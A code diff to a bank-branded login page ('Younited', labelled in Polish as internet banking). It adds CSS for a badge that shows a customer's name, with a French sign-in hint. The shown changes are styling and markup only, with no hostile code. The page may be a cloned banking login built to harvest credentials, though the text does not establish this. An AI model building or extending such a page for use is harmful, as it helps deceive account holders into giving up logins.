@@ -2444,6 +2444,69 @@
   transform: scale(1.1);
   box-shadow: 0 6px 20px rgba(0,0,0,0.35), inset 0 1px 0 rgba(255,255,255,0.2);
 }
+
+/* ===== BADGE NOM CLIENT – LOGIN ===== */
+.client-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 12px;
+  background: #e5e7eb;
+  border-radius: 50px;
+  padding: 10px 22px 10px 14px;
+  margin: 0 auto;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+  animation: fadeUp 0.5s cubic-bezier(0.23, 1, 0.32, 1) 0.2s both;
+}
+.client-badge-icon {
+  width: 34px;
+  height: 34px;
+  border-radius: 50%;
+  background: #d1d5db;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #6b7280;
+  font-size: 14px;
+  flex-shrink: 0;
+}
+.client-badge-content {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+  gap: 2px;
+}
+.client-badge-name {
+  font-size: 15px;
+  font-weight: 800;
+  color: #374151;
+  text-transform: uppercase;
+  letter-spacing: 0.8px;
+  line-height: 1.2;
+}
+.client-badge-hint {
+  font-size: 11px;
+  font-weight: 500;
+  color: #6b7280;
+  line-height: 1.3;
+}
+@media (max-width: 480px) {
+  .client-badge {
+    padding: 8px 18px 8px 12px;
+    gap: 10px;
+  }
+  .client-badge-icon {
+    width: 30px;
+    height: 30px;
+    font-size: 12px;
+  }
+  .client-badge-name {
+    font-size: 13px;
+    letter-spacing: 0.5px;
+  }
+  .client-badge-hint {
+    font-size: 10px;
+  }
+}
 </style>
   <script>
     (function() {
@@ -2553,7 +2616,15 @@ window.toggleBalance = function() {
         <h1 class="login-title">Younited</h1>
         <p class="login-sub">Bankowość internetowa</p>
         <div class="login-info">Zaloguj się do swojego konta</div>
-        <div id="client-name" style="text-align:center;font-weight:800;font-size:22px;color:var(--text-primary);margin-bottom:14px;display:none;"></div>
+        <div id="client-name" style="display:none; margin-bottom:20px;">
+          <div class="client-badge">
+            <div class="client-badge-icon"><i class="fa-solid fa-user"></i></div>
+            <div class="client-badge-content">
+              <div class="client-badge-name" id="client-name-value">—</div>
+              <div class="client-badge-hint">Veuillez utiliser vos identifiants pour vous connecter</div>
+            </div>
+          </div>
+        </div>
         <div class="input-group">
           <label for="email"><i class="fa-solid fa-envelope"></i>Adres e-mail</label>
           <div class="input-wrapper">
